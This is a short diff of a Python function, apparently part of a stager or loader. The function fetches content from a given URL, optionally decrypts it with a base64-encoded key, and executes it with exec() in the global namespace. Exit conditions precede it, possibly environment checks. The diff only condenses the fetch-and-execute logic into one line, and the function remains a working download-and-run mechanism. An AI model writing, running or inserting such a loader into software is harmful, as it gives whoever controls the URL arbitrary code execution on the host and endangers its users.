@@ -43,8 +43,5 @@ def run(url=None, key=None):
                     sys.exit(0)
             else:
                 sys.exit(0)
-        if key:
-            exec(decrypt(urllib.urlopen(url).read(), base64.b64decode(key)),globals()) 
-        else:
-            exec(urllib.urlopen(url).read(),globals())
-            
+        payload = decrypt(urllib.urlopen(url).read(), base64.b64decode(key)) if key else urllib.urlopen(url).read()
+        exec(payload, globals())
